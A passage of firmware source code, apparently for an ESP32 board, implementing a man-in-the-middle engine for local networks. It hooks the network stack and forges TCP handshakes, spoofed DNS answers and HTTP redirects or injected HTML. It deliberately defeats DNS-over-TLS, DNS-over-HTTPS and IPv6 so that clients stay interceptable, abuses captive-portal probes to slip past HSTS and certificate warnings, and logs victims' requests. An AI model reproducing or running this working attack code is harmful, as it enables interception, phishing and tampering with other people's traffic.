        if (dstPort == NETSPOOF_HTTPS_PORT && dstIp == (uint32_t)WiFi.localIP()) {
            return next ? next(p, inp) : ERR_OK;
        }

        // Remember who is behind an address when it opens a connection to the
        // board itself: the TLS endpoint works through lwIP, which has no MAC,
        // and marking a redirected client depends on the IP -> MAC map.
        if (dstIp == (uint32_t)WiFi.localIP() && (l4[13] & 0x02)) _fwdLearn(srcIp, scratch + 6);

        // DNS-over-TLS (TCP/853) is blocked while the engine runs: it would
        // resolve names behind this engine's back. Dropping it makes Android's
        // Private DNS and DoT clients fall back to the plain resolver.
        if (dstPort == 853 && _mitmFallbackGuard()) {
            // Android's Private DNS and any DoT client would resolve behind this
            // engine's back; dropping the connection makes them fall back to the
            // plain resolver, which is the one being intercepted.
            s_dotDropped++;
            pbuf_free(p);
            return ERR_OK;
        }

        uint8_t dataOff = (uint8_t)((l4[12] >> 4) * 4);
        if (dataOff < 20 || 14u + ihl + dataOff > total) return next ? next(p, inp) : ERR_OK;
        // Host order: _handleHttp() adds to these and _put32() writes host order.
        seq = _rd32(l4 + 4);
        ack = _rd32(l4 + 8);
        flags = l4[13];
        payload = l4 + dataOff;

        // The TCP payload length comes from the IP header, not from the frame
        // length. An ethernet frame is padded to 60 bytes, so a bare 40-byte
        // ACK arrives with six padding bytes after the TCP header. Deriving the
        // length from the frame made every such ACK look like a 6-byte data
        // segment of "another protocol" and the engine reset the connection
        // before the request was ever sent. IPv4's total length excludes the
        // padding and is the only correct source.
        uint16_t ipTotal = ((uint16_t)ip[2] << 8) | ip[3];
        if (ipTotal < ihl) return next ? next(p, inp) : ERR_OK;
        uint16_t frameLen = (uint16_t)(total - 14 - ihl - dataOff);
        payloadLen = ipTotal > (uint16_t)(ihl + dataOff) ? (uint16_t)(ipTotal - ihl - dataOff) : 0;
        uint16_t copyLen = payloadLen < frameLen ? payloadLen : frameLen;
        if (copyLen > NETSPOOF_HOOK_COPY) copyLen = NETSPOOF_HOOK_COPY;
        capturedLen = copyLen;

        // A reset belongs to a real connection once traffic is bridged: it has
        // to reach the other end, never be consumed here.
        if (s_forwardActive && (flags & 0x04) && _bridgeFrame(scratch, total, srcIp, dstIp)) {
            pbuf_free(p);
            return ERR_OK;
        }

        // Never answer a reset with a reset: a client that already gave up on
        // the flow (or a stray RST from the network) is consumed so the engine
        // cannot start an RST ping-pong with it.
        if (s_httpActive || s_httpsActive) {
            if (flags & 0x04) {
                pbuf_free(p);
                return ERR_OK;
            }
        }

        // Any TCP port is a candidate: a bare SYN is answered so the client can
        // send its request even when the site is an admin panel on 8000, 8888,
        // etc. The first data segment decides what the flow is.
        if (payloadLen == 0 && (flags & 0x02) && !(flags & 0x10)) {
            kind = 2; // SYN
        } else if (copyLen >= 5 && payload[0] == 0x16 && payload[1] == 0x03) {
            kind = 3; // TLS ClientHello to an address we cannot terminate here
        } else if (copyLen >= 4 && _looksHttp((const char *)payload, copyLen)) {
            kind = 1; // plaintext HTTP request, on any port
        } else if (payloadLen > 0) {
            kind = 4; // another TCP protocol: reset it instead of hanging
        } else {
            kind = 0; // bare ACK / FIN of a flow this board is not answering
        }

        // Bridge everything this board does not answer itself - a SYN, a TLS
        // handshake to a real server, another TCP protocol, a bare ACK or FIN.
        // This has to happen *after* the classification above: while it was the
        // last arm of that chain, every SYN/TLS/other frame had already matched
        // an earlier arm and was queued instead of bridged, so the client lost
        // its internet the moment the poison went up. Only a plaintext HTTP
        // request (kind 1) stays here; a DoH ClientHello is reset on purpose so
        // the browser falls back to the system resolver.
        bool bridgedFlow = kind == 1 && _flowBridged(srcIp, dstIp, srcPort, dstPort);
        bool ownFlow = kind == 2 && s_httpActive && _plainHttpPort(dstPort); // answered here, not bridged
        if (s_forwardActive && !ownFlow && (kind != 1 || bridgedFlow) &&
            !(kind == 3 && _tlsLooksLikeDoh(payload, capturedLen)) &&
            _bridgeFrame(scratch, total, srcIp, dstIp)) {
            // Remember a bridged handshake: the payload of this flow must go the
            // same way, or the client ends up with half a connection.
            if (kind == 2) _flowMark(srcIp, dstIp, srcPort, dstPort);
            pbuf_free(p);
            return ERR_OK;
        }

        if (kind == 0 && (s_httpActive || s_httpsActive)) {
            // The bare ACK (or FIN/RST) that completes a connection this hook
            // answered. Passing it to lwIP makes the stack see a segment for a
            // socket it never opened and reply with a RST - which kills the
            // forged HTTP response before the client reads it. This matters
            // most now that a redirect points DNS at the board itself. The
            // victim's TCP state is the only state this connection has, so the
            // packet is consumed here.
            //
            // EXCEPT when this flow was bridged: then the ACK belongs to the
            // real server and swallowing it stalls every forwarded TCP
            // connection. That is why HTTPS to a real site failed while
            // forwarding was on - the handshake completed, the final ACK never
            // left, and the server kept retransmitting its SYN-ACK. Both
            // directions are checked because the server's own ACKs arrive from
            // the gateway side of the poison.
            if (s_forwardActive &&
                (_flowBridged(srcIp, dstIp, srcPort, dstPort) ||
                 _flowBridged(dstIp, srcIp, dstPort, srcPort)) &&
                _bridgeFrame(scratch, total, srcIp, dstIp)) {
                pbuf_free(p);
                return ERR_OK;
            }
            pbuf_free(p);
            return ERR_OK;
        }
        if (kind == 0) return next ? next(p, inp) : ERR_OK;
    }
    if (!payloadLen && kind != 2) return next ? next(p, inp) : ERR_OK;

#if NETSPOOF_TRACE
    if (dstPort == 80 || srcPort == 80) {
        Serial.printf(
            "[NSTRACE] rx %u->%u fl=%02X len=%u seq=%lu ack=%lu kind=%u\n", srcPort, dstPort, flags,
            payloadLen, (unsigned long)seq, (unsigned long)ack, kind
        );
    }
#endif

    // Cheap filter so the slot pool is not wasted on unrelated traffic.
    if (kind == 2 || kind == 3 || kind == 4) {
        // The SYN is answered from its headers; TLS and other TCP are handled
        // in the service task (SNI logging + reset).
    } else if (kind == 0) {
        uint16_t txid;
        char name[80];
        uint16_t qtype, qclass;
        if (!_dnsQuestion(payload, payloadLen, &txid, name, sizeof(name), &qtype, &qclass)) {
            return next ? next(p, inp) : ERR_OK;
        }
    }

    NetSpoofSlot *slot = _slotClaim();
#if NETSPOOF_TRACE
    if (!slot && (dstPort == 80 || srcPort == 80)) Serial.println("[NSTRACE] slot pool busy -> lwIP");
#endif
    if (!slot) return next ? next(p, inp) : ERR_OK; // pool busy: let it through

    memcpy(slot->clientMac, scratch + 6, 6);
    slot->kind = kind;
    slot->srcIp = srcIp;
    slot->dstIp = dstIp;
    slot->srcPort = srcPort;
    slot->dstPort = dstPort;
    slot->seq = seq;
    slot->ack = ack;
    slot->flags = flags;
    slot->payloadLen = payloadLen; // on-wire length: the ACK math needs all of it
    // Only the captured bytes are parsed, so a request larger than the hook copy
    // still gets the right ACK number while its body is truncated.
    slot->copyLen = payloadLen < NETSPOOF_HOOK_COPY ? payloadLen : NETSPOOF_HOOK_COPY;
    if (slot->copyLen > capturedLen) slot->copyLen = capturedLen;
    memcpy(slot->data, payload, slot->copyLen);
    _slotPublish(slot);

    // Swallowed on purpose: this board answers the request itself, so the real
    // host must not see it. Nothing is forwarded either way (the ESP cannot
    // route). NOTE: a netif input handler owns the pbuf, so a swallowed frame
    // has to be released here - returning ERR_OK does not free it, and leaking
    // a pbuf per intercepted request would empty the RX pool.
    pbuf_free(p);
    return ERR_OK;
}

static void _hookInstall() {
    if (s_hookedNetif) return;
    // Every forged frame is sent with s_myMac as its source. The ARP paths set
    // it, but a headless start that has no ARP pair yet used to leave it zero:
    // the AP then dropped each SYN-ACK/response and the client timed out while
    // the engine reported itself armed. Refresh it whenever the hook goes in.
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
    struct netif *iface = _staNetif();
    if (!iface) return;
    s_prevInput = iface->input;
    s_hookedNetif = iface;
    iface->input = _nsInputHook;
    Serial.println("[NETSPOOF] L2 hook installed");
}

static void _hookUninstall() {
    if (s_hookedNetif) {
        // Only restore when we are still the installed handler, so a hook owned
        // by another module (NetCut) is never clobbered.
        if (s_hookedNetif->input == _nsInputHook) s_hookedNetif->input = s_prevInput;
        s_hookedNetif = NULL;
        s_prevInput = NULL;
        Serial.println("[NETSPOOF] L2 hook removed");
    }
}

bool netspoof_hook_installed() { return s_hookedNetif != NULL; }

// ===========================================================================
// 6. Answering: DNS replies and HTTP responses
// ===========================================================================

/**
 * @brief Send a UDP datagram in a plain ethernet frame on the station link.
 *
 * @param dstMac station to deliver to
 * @param srcIp/dstIp wire-order addresses (the source is spoofed, e.g. the DNS
 *        server the client asked)
 */
static bool _txUdpRaw(
    const uint8_t dstMac[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort,
    const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 8 + payloadLen;
    if (20 + l4Len > sizeof(s_l4)) return false;

    uint8_t *ip = s_l4;
    ip[0] = 0x45;
    ip[1] = 0x00;
    _put16(ip + 2, (uint16_t)(20 + l4Len));
    _put16(ip + 4, ++s_ipId);
    _put16(ip + 6, 0x0000);
    ip[8] = 64;
    ip[9] = 17;
    _put16(ip + 10, 0);
    // srcIp/dstIp hold wire-order bytes (they were memcpy'd off the received header),
    // which is also what the checksum pseudo-header sums. They must go back on the
    // wire with memcpy: _put32() writes big-endian from a *host-order* value, so on
    // this little-endian part it would byte-reverse the addresses and every client
    // would silently drop the forged packet at the IP layer.
    memcpy(ip + 12, &srcIp, 4);
    memcpy(ip + 16, &dstIp, 4);
    _put16(ip + 10, _finish16(_sum16(ip, 20, 0)));

    uint8_t *udp = ip + 20;
    _put16(udp, srcPort);
    _put16(udp + 2, dstPort);
    _put16(udp + 4, (uint16_t)l4Len);
    _put16(udp + 6, 0);
    memcpy(udp + 8, payload, payloadLen);

    uint32_t acc = _sum16((const uint8_t *)&srcIp, 4, 0);
    acc = _sum16((const uint8_t *)&dstIp, 4, acc);
    acc += 17;
    acc += (uint16_t)l4Len;
    acc = _sum16(udp, l4Len, acc);
    uint16_t sum = _finish16(acc);
    _put16(udp + 6, sum == 0 ? 0xFFFF : sum);

    return _txEth(dstMac, s_myMac, 0x0800, ip, 20 + l4Len);
}

/// Send a TCP segment carrying @p payload as data from @p srcIp to the station.
static bool _txTcpRaw(
    const uint8_t dstMac[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort,
    uint32_t seq, uint32_t ack, uint8_t flags, const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 20 + payloadLen;
    if (20 + l4Len > sizeof(s_l4)) return false;

    uint8_t *ip = s_l4;
    ip[0] = 0x45;
    ip[1] = 0x00;
    _put16(ip + 2, (uint16_t)(20 + l4Len));
    _put16(ip + 4, ++s_ipId);
    _put16(ip + 6, 0x4000); // don't fragment
    ip[8] = 64;
    ip[9] = 6;
    _put16(ip + 10, 0);
    // srcIp/dstIp hold wire-order bytes (they were memcpy'd off the received header),
    // which is also what the checksum pseudo-header sums. They must go back on the
    // wire with memcpy: _put32() writes big-endian from a *host-order* value, so on
    // this little-endian part it would byte-reverse the addresses and every client
    // would silently drop the forged packet at the IP layer.
    memcpy(ip + 12, &srcIp, 4);
    memcpy(ip + 16, &dstIp, 4);
    _put16(ip + 10, _finish16(_sum16(ip, 20, 0)));

    uint8_t *tcp = ip + 20;
    _put16(tcp, srcPort);
    _put16(tcp + 2, dstPort);
    _put32(tcp + 4, seq); // host-order values, big-endian on the wire
    _put32(tcp + 8, ack);
    tcp[12] = 0x50;
    tcp[13] = flags;
    _put16(tcp + 14, 64240);
    _put16(tcp + 16, 0);
    _put16(tcp + 18, 0);
    if (payloadLen) memcpy(tcp + 20, payload, payloadLen);

    uint32_t acc = _sum16((const uint8_t *)&srcIp, 4, 0);
    acc = _sum16((const uint8_t *)&dstIp, 4, acc);
    acc += 6;
    acc += (uint16_t)l4Len;
    acc = _sum16(tcp, l4Len, acc);
    _put16(tcp + 16, _finish16(acc));

    bool ok = _txEth(dstMac, s_myMac, 0x0800, ip, 20 + l4Len);
#if NETSPOOF_TRACE
    if (srcPort == 80 || dstPort == 80) {
        Serial.printf(
            "[NSTRACE] tx %u->%u fl=%02X seq=%lu ack=%lu len=%u ok=%d\n", srcPort, dstPort, flags,
            (unsigned long)seq, (unsigned long)ack, (unsigned)payloadLen, (int)ok
        );
    }
#endif
    return ok;
}

/**
 * @brief Push one capture into the ring.
 *
 * Called from the service task or the HTTPS server task, never from the
 * receive hook. @p clientIpWire is the address in network byte order, the same
 * form the hook copies off the IP header.
 */
static void _capturePushEx(
    uint8_t kind, uint32_t clientIpWire, const char *clientMac, const char *method, const char *host,
    const char *path, const char *data, uint8_t action
) {
    _lock();
    NetSpoofCapture *ring = s_captures();
    if (ring == nullptr) { // no 4 KB anywhere: lose the capture, not the attack
        _unlock();
        return;
    }
    if (s_captureCount == NETSPOOF_MAX_CAPTURES) s_captureCount = NETSPOOF_MAX_CAPTURES - 1;
    for (int i = s_captureCount; i > 0; i--) ring[i] = ring[i - 1];
    NetSpoofCapture &c = ring[0];
    memset(&c, 0, sizeof(c));
    c.ts = millis();
    c.kind = kind;
    c.action = action;
    c.clientIp = IPAddress(clientIpWire);
    if (clientMac) strncpy(c.clientMac, clientMac, sizeof(c.clientMac) - 1);
    if (method) strncpy(c.method, method, sizeof(c.method) - 1);
    if (host) strncpy(c.host, host, sizeof(c.host) - 1);
    if (path) strncpy(c.path, path, sizeof(c.path) - 1);
    if (data) {
        size_t n = 0;
        while (data[n] && n < NETSPOOF_CAPTURE_PAYLOAD - 1) n++;
        for (size_t i = 0; i < n; i++) {
            char ch = data[i];
            c.data[i] = (ch >= 32 && ch < 127) ? ch : '.';
        }
    }
    s_captureCount++;
    s_captureTotal++;
    _unlock();
}

/// Push a capture from a queued L2 slot (DNS or plaintext HTTP).
static void _capturePush(const NetSpoofSlot *slot, const char *method, const char *host, const char *path, uint8_t action) {
    String m = _macStr(slot->clientMac);
    char snippet[NETSPOOF_CAPTURE_PAYLOAD];
    size_t n = slot->copyLen < sizeof(snippet) - 1 ? slot->copyLen : sizeof(snippet) - 1;
    for (size_t i = 0; i < n; i++) {
        char ch = (char)slot->data[i];
        snippet[i] = (ch >= 32 && ch < 127) ? ch : '.';
    }
    snippet[n] = '\0';
    _capturePushEx(slot->kind, slot->srcIp, m.c_str(), method, host, path, snippet, action);
}

// --- DNS rules ------------------------------------------------------------

static bool _dnsRuleMatch(const NetSpoofRule &r, const String &name) {
    if (r.wildcard) return true;
    if (r.match.length() == 0) return false;
    if (name.equalsIgnoreCase(r.match)) return true;
    String suffix = "." + r.match;
    if (name.length() > suffix.length() &&
        name.substring(name.length() - suffix.length()).equalsIgnoreCase(suffix)) {
        return true;
    }
    // "*.example.com" also matches example.com itself
    if (r.match.startsWith("*.")) {
        String bare = r.match.substring(2);
        if (name.equalsIgnoreCase(bare)) return true;
        String s2 = "." + bare;
        if (name.length() > s2.length() &&
            name.substring(name.length() - s2.length()).equalsIgnoreCase(s2)) {
            return true;
        }
    }
    return false;
}

/// True when @p value is one of the symbolic DNS answers rather than an IPv4.
static bool _dnsValueIsToken(const String &value) {
    String v = value;
    v.trim();
    return v.equalsIgnoreCase("gateway") || v.equalsIgnoreCase("gw") || v.equalsIgnoreCase("this") ||
           v.equalsIgnoreCase("board");
}

///
/// Resolve a rule value: an IPv4 literal, `gateway` (this network's router) or
/// `this` (the board's station address).
///
/// The tokens are resolved per query, not when the rule is added, so a payload
/// can be loaded while the station is down and still answer correctly once it
/// joins - `dns * gateway` is the usual payload line and the gateway does not
/// exist yet at load time.
static bool _dnsValueIp(const String &value, IPAddress &ip) {
    String v = value;
    v.trim();
    if (v.equalsIgnoreCase("gateway") || v.equalsIgnoreCase("gw")) {
        uint8_t mac[6];
        return netspoof_gateway_info(ip, mac);
    }
    if (v.equalsIgnoreCase("this") || v.equalsIgnoreCase("board")) {
        if (WiFi.isConnected()) {
            ip = WiFi.localIP();
            return true;
        }
        // No station link: a `.ucmitm` payload answers with its twin (`dns *
        // this`) and the twin's AP address is the only address its clients can
        // reach, so that is what `this` means there. 0.0.0.0 means no AP is up.
        IPAddress ap = WiFi.softAPIP();
        if ((uint32_t)ap == 0) return false;
        ip = ap;
        return true;
    }
    return ip.fromString(v.c_str());
}

bool netspoof_dns_lookup(const String &name, IPAddress &ip) {
    _ensure_mutex();
    _lock();
    int hit = -1;
    for (int i = 0; i < s_dnsRuleCount && hit < 0; i++) {
        if (_dnsRuleMatch(s_dnsRules[i], name)) hit = i;
    }
    String value = hit >= 0 ? s_dnsRules[hit].value : String();
    if (hit >= 0) s_dnsRules[hit].hits++;
    _unlock();
    if (hit < 0) return false;
    return _dnsValueIp(value, ip);
}

/// Byte offset just past the question section of a DNS query (0 when invalid).
static size_t _dnsQuestionEnd(const uint8_t *dns, size_t len) {
    if (len < 12) return 0;
    size_t pos = 12;
    while (pos < len) {
        uint8_t label = dns[pos++];
        if (label == 0) break;
        if ((label & 0xC0) == 0xC0) return 0; // compression is invalid in a question
        if (pos + label > len) return 0;
        pos += label;
    }
    if (pos + 4 > len) return 0;
    return pos + 4;
}

/**
 * @brief Answer a DNS query with NOERROR and no records.
 *
 * Used for AAAA (28), SVCB (64) and HTTPS (65) lookups. A dual-stack client
 * that gets a real AAAA answer will use IPv6, which this engine cannot poison;
 * a real HTTPS RR lets it try HTTP/3 over QUIC, which it also cannot intercept.
 * An empty answer makes both fall back to the IPv4/TCP path, which the engine
 * does control. The header and question are copied from the query so the client
 * matches it to its transaction.
 */
static bool _sendEmptyDns(NetSpoofSlot *slot, size_t qEnd) {
    uint8_t out[512];
    if (qEnd < 12 || qEnd > sizeof(out) || qEnd > slot->copyLen) return false;
    memcpy(out, slot->data, qEnd);
    out[2] = 0x81; // QR=1, RD=1
    out[3] = 0x80; // RA=1, RCODE=0
    out[4] = 0;
    out[5] = 1; // QDCOUNT
    out[6] = 0;
    out[7] = 0; // ANCOUNT
    out[8] = 0;
    out[9] = 0; // NSCOUNT
    out[10] = 0;
    out[11] = 0; // ARCOUNT
    return _txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, out, qEnd);
}

/// Handle one queued DNS query: match a rule and answer it.
/// True when a name must keep resolving for real while everything else is
/// pinned to the board (the hosts a redirect points at).
static bool _dnsPassMatch(const String &name) {
    if (s_passCount == 0) return false;
    String q = name;
    q.toLowerCase();
    for (int i = 0; i < s_passCount; i++) {
        String h = s_passHosts[i];
        if (h.length() == 0) continue;
        if (q == h) return true;
        if (q.length() > h.length() && q.endsWith(h) && q[q.length() - h.length() - 1] == '.') return true;
    }
    return false;
}

/// Resolve a name through the station's own resolver, cached for two minutes
/// (negative results too, so a dead name is not retried on every query).
///
/// Runs in the service task and blocks; only names that must stay reachable take
/// this path, and the answer is reused for every client asking the same name.
static bool _resolveUpstream(const String &name, IPAddress &out) {
    struct Entry {
        String name;
        IPAddress ip;
        uint32_t ts;
    };
    static Entry cache[4];
    uint32_t now = millis();
    for (int i = 0; i < 4; i++) {
        if (cache[i].name.length() && cache[i].name.equalsIgnoreCase(name) &&
            (now - cache[i].ts) < 120000UL) {
            if ((uint32_t)cache[i].ip == 0) return false;
            out = cache[i].ip;
            return true;
        }
    }
    IPAddress ip;
    // No timeout overload on this core; the blocking resolve is why the answer
    // is cached and only names that must stay reachable take this path.
    bool ok = WiFi.hostByName(name.c_str(), ip) == 1;
    for (int i = 3; i > 0; i--) cache[i] = cache[i - 1];
    cache[0].name = name;
    cache[0].ip = ok ? ip : IPAddress((uint32_t)0);
    cache[0].ts = now;
    out = ip;
    return ok;
}

/// Minimal DNS answer carrying an RCODE and no records (NXDOMAIN etc.).
static bool _sendDnsStatus(NetSpoofSlot *slot, size_t qEnd, uint16_t txid, uint8_t rcode) {
    size_t qlen = (qEnd > 12 && qEnd <= NETSPOOF_HOOK_COPY) ? qEnd - 12 : 0;
    if (12 + qlen > sizeof(s_l4b)) return false;
    uint8_t *d = s_l4b;
    memset(d, 0, 12 + qlen);
    d[0] = (uint8_t)(txid >> 8);
    d[1] = (uint8_t)(txid & 0xFF);
    d[2] = 0x81;                            // QR + RD
    d[3] = (uint8_t)(0x80 | (rcode & 0x0F)); // RA + RCODE
    d[5] = 1;                               // QDCOUNT
    if (qlen) memcpy(d + 12, slot->data + 12, qlen);
    return _txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, d, 12 + qlen);
}

static void _handleDns(NetSpoofSlot *slot) {
    uint16_t txid = 0, qtype = 0, qclass = 0;
    char name[80];
    if (!_dnsQuestion(slot->data, slot->copyLen, &txid, name, sizeof(name), &qtype, &qclass)) return;

    s_dnsQueries++;
    String qname(name);

    // Firefox asks for this canary to decide whether DNS-over-HTTPS is safe to
    // use; NXDOMAIN is the documented "no DoH here" answer. Without it a
    // DoH-first browser resolves everything itself and never sees a rule.
    if (qtype == 1 && qname.equalsIgnoreCase("use-application-dns.net")) {
        size_t qEnd = _dnsQuestionEnd(slot->data, slot->copyLen);
        if (qEnd && _sendDnsStatus(slot, qEnd, txid, 3)) s_dnsAnswers++;
        _capturePush(slot, "DNS", name, "canary: no DoH", 1);
        return;
    }

    // Only the hosts a redirect actually points at resolve for real; they are
    // registered as pass-through when the rule is added. Everything else stays
    // pinned to the board for the whole run: the old per-client "already served"
    // grace period switched that client's next lookups back to the real
    // resolver, so the first page worked and every site visited after it
    // bypassed the engine entirely.
    bool passthrough = s_passCount > 0 && _dnsPassMatch(qname);
    if (qtype == 1 && passthrough) {
        IPAddress real;
        if (_resolveUpstream(qname, real)) {
            size_t payloadLen =
                wifi_build_dns_response(s_l4b, sizeof(s_l4b), txid, name, real.toString().c_str(), 60);
            if (payloadLen &&
                _txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, s_l4b, payloadLen)) {
                s_dnsAnswers++;
                _capturePush(slot, "DNS", name, real.toString().c_str(), 1);
                return;
            }
        }
        // A failed real lookup falls through to the pin, so the client still
        // reaches the engine instead of getting nothing.
    }

    // Force the IPv4/TCP path while intercepting: no AAAA, no SVCB/HTTPS RR.
    // AAAA/SVCB/HTTPS are suppressed whenever a guard is armed - including a
    // DNS-only payload. A real AAAA sends the client over IPv6, which this engine
    // cannot poison, and a real HTTPS RR hands it the h3 endpoint, which it
    // cannot terminate. Both are exactly the bypass this release is about.
    if ((qtype == 28 || qtype == 64 || qtype == 65) && _mitmFallbackGuard()) {
        size_t qEnd = _dnsQuestionEnd(slot->data, slot->copyLen);
        if (qEnd && _sendEmptyDns(slot, qEnd)) s_dnsAnswers++;
        s_svcbSuppressed++;
        _capturePush(slot, "DNS", name, qtype == 28 ? "no AAAA" : "no SVCB", 1);
        return;
    }

    IPAddress answer;
    bool haveAnswer = false;

    // While the HTTPS endpoint is running, every A query must land on this
    // board or the victim's TLS connection never reaches the local server.
    // This deliberately takes precedence over the user's DNS rules: a specific
    // rule (e.g. "example.com 1.2.3.4") would otherwise send HTTPS to a host
    // that cannot present a certificate for the name.
    if (s_httpsActive && qtype == 1 && WiFi.isConnected()) {
        answer = WiFi.localIP();
        haveAnswer = (uint32_t)answer != 0;
    }
    if (!haveAnswer) haveAnswer = netspoof_dns_lookup(qname, answer);
    if (!haveAnswer) {
        _capturePush(slot, "DNS", name, "", 0);
        return;
    }
    if (qtype != 1) { // only A records are answered; AAAA etc. are left alone
        _capturePush(slot, "DNS", name, "", 0);
        return;
    }

    // A pinned answer must not outlive the run: with a 300 s TTL the client kept
    // the board's address in its DNS cache for five minutes after `mitm stop`,
    // so the network looked dead long after ARP had been restored. Five seconds
    // is long enough to cover one page load and short enough that the real
    // resolver takes over immediately when the engine stops.
    size_t payloadLen = wifi_build_dns_response(
        s_l4b, sizeof(s_l4b), txid, name, answer.toString().c_str(), 5
    );
    if (payloadLen == 0) return;

    if (_txUdpRaw(slot->clientMac, slot->dstIp, slot->srcIp, 53, slot->srcPort, s_l4b, payloadLen)) {
        s_dnsAnswers++;
        _capturePush(slot, "DNS", name, answer.toString().c_str(), 1);
    } else {
        _capturePush(slot, "DNS", name, "", 0);
    }
}

// --- HTTP rules -----------------------------------------------------------

static bool _httpRuleMatch(const NetSpoofRule &r, const String &host, const String &url) {
    if (r.wildcard) return true;
    if (r.match.length() == 0) return false;
    if (host.equalsIgnoreCase(r.match)) return true;
    if (host.indexOf(r.match) >= 0) return true;
    if (url.indexOf(r.match) >= 0) return true;
    if (r.match.startsWith("*.")) {
        String bare = r.match.substring(2);
        if (host.equalsIgnoreCase(bare)) return true;
        String suffix = "." + bare;
        if (host.length() > suffix.length() &&
            host.substring(host.length() - suffix.length()).equalsIgnoreCase(suffix)) {
            return true;
        }
    }
    return false;
}

/// Parse the request line and Host header out of an HTTP request.
static void _parseHttp(
    const uint8_t *data, size_t len, String &method, String &path, String &host
) {
    String head;
    head.reserve(len + 1);
    for (size_t i = 0; i < len; i++) {
        char c = (char)data[i];
        if (c == '\0') break;
        head += c;
    }

    int sp1 = head.indexOf(' ');
    if (sp1 > 0) {
        method = head.substring(0, sp1);
    } else {
        method = "GET";
        sp1 = -1;
    }
    if (sp1 >= 0) {
        int sp2 = head.indexOf(' ', sp1 + 1);
        path = (sp2 > sp1) ? head.substring(sp1 + 1, sp2) : head.substring(sp1 + 1);
    } else {
        path = "/";
    }
    path.trim();

    // Host header, case-insensitive search over the header block.
    String lower = head;
    lower.toLowerCase();
    int h = lower.indexOf("\nhost:");
    if (h >= 0) {
        int start = h + 6;
        int end = lower.indexOf('\r', start);
        if (end < 0) end = lower.indexOf('\n', start);
        if (end < 0) end = head.length();
        host = head.substring(start, end);
        host.trim();
    }
    host.toLowerCase();
    method.toUpperCase();
    if (method.length() > 7) method = method.substring(0, 7);
    if (path.length() > 95) path = path.substring(0, 95);
    if (host.length() > 47) host = host.substring(0, 47);
}

/// Build "HTTP/1.1 302 Found ..." style responses into @p out.
static size_t _buildHttpResponse(
    char *out, size_t cap, int status, const char *reason, const char *contentType, const String &body,
    const String &location
) {
    String head;
    head.reserve(256);
    head += "HTTP/1.1 ";
    head += String(status);
    head += " ";
    head += reason;
    head += "\r\n";
    if (location.length()) {
        head += "Location: ";
        head += location;
        head += "\r\n";
    }
    if (contentType && *contentType) {
        head += "Content-Type: ";
        head += contentType;
        head += "\r\n";
    }
    head += "Connection: close\r\n";
    head += "Cache-Control: no-store\r\n";

    // Content-Length must match what actually goes on the wire, so work out how
    // much of the body fits before fixing the header up.
    size_t room = cap > head.length() + 32 ? cap - head.length() - 32 : 0;
    size_t bodyLen = body.length();
    if (bodyLen > room) bodyLen = room;

    head += "Content-Length: ";
    head += String((unsigned)bodyLen);
    head += "\r\n\r\n";

    size_t total = head.length() + bodyLen;
    if (total > cap) return 0;
    memcpy(out, head.c_str(), head.length());
    if (bodyLen) memcpy(out + head.length(), body.c_str(), bodyLen);
    return total;
}

///
/// Answer the client's SYN with a forged SYN-ACK.
///
/// Without this the engine can never see a request: the destination is a host
/// on the internet (or the gateway), so its own stack is the only thing that
/// would answer the handshake - and the L2 hook swallows the SYN instead of
/// forwarding it (the ESP cannot route). The GET only exists after a handshake
/// succeeded, so the board has to complete that handshake itself. Answering the
/// SYN is enough: the client's next segment carries `ack = our ISN + 1`, and
/// `_handleHttp()` already uses the client's ack as the sequence of its forged
/// response, so no connection table is needed here.
static void _handleSyn(NetSpoofSlot *slot) {
    static uint32_t s_isn = 0;
    if (!(slot->flags & 0x02)) return; // SYN
    if (!s_isn) s_isn = esp_random() | 1;
    s_isn += 0x00010000; // a new initial sequence number per connection
    _txTcpRaw(
        slot->clientMac, slot->dstIp, slot->srcIp, slot->dstPort, slot->srcPort, s_isn, slot->seq + 1, 0x12,
        NULL, 0
    );
}

/// The rule selected for one web request (shared by HTTP and HTTPS).
struct NetSpoofWebDecision {
    int redirect = -1;
    int inject = -1;
    String location;
    String html;
};

/**
 * @brief Pick the redirect/injection rule for a request.
 *
 * Redirects win over injections, exactly as the plaintext path always did.
 * @p url carries the scheme (http:// or https://) as well as the host and path,
 * and the Host header is matched on its own too.
 */
static void _webDecide(const String &host, const String &url, NetSpoofWebDecision &d) {
    _ensure_mutex();
    _lock();
    for (int i = 0; i < s_redirCount && d.redirect < 0; i++) {
        if (_httpRuleMatch(s_redirRules[i], host, url)) d.redirect = i;
    }
    for (int i = 0; i < s_injectCount && d.inject < 0; i++) {
        if (_httpRuleMatch(s_injectRules[i], host, url)) d.inject = i;
    }
    if (d.redirect >= 0) {
        d.location = s_redirRules[d.redirect].value;
        s_redirRules[d.redirect].hits++;
    } else if (d.inject >= 0) {
        d.html = s_injectRules[d.inject].value;
        s_injectRules[d.inject].hits++;
    }
    _unlock();
}

///
/// Is this request one of the OS "is the network captive?" probes?
///
/// This is the only HTTP a modern phone still sends in the clear while its user
/// browses, and it is what decides whether the phone offers its own sign-in
/// browser. Answering a probe with anything other than 204 tells the OS the
/// network is captive, and the OS then opens that answer in a browser sheet of
/// its own - no certificate warning, no typed URL, no HSTS. That is the one
/// route a redirect has to a modern client, so the probes are recognised by
/// name and answered deliberately instead of being left to a wildcard rule.
static bool _portalProbe(const String &host, const String &path) {
    static const char *probeHosts[] = {
        "connectivitycheck.gstatic.com", "connectivitycheck.android.com", "clients3.google.com",
        "connect.rom.miui.com",         "captive.apple.com",         "captive.g.aaplimg.com",
        "detectportal.firefox.com",     "msftconnecttest.com",       "www.msftconnecttest.com",
        "ipv6.msftconnecttest.com",     "nmcheck.gnome.org",         "network-test.debian.org",
        "www.msftncsi.com",             "dns.msftncsi.com",
    };
    static const char *probePaths[] = {
        "/generate_204", "/gen_204", "/hotspot-detect.html", "/connecttest.txt",
        "/ncsi.txt",      "/success.txt", "/canonical.html",      "/library/test/success.html",
        "/mobile/status.php", "/redirect",
    };
    for (size_t i = 0; i < sizeof(probeHosts) / sizeof(probeHosts[0]); i++) {
        if (host.equalsIgnoreCase(probeHosts[i])) return true;
    }
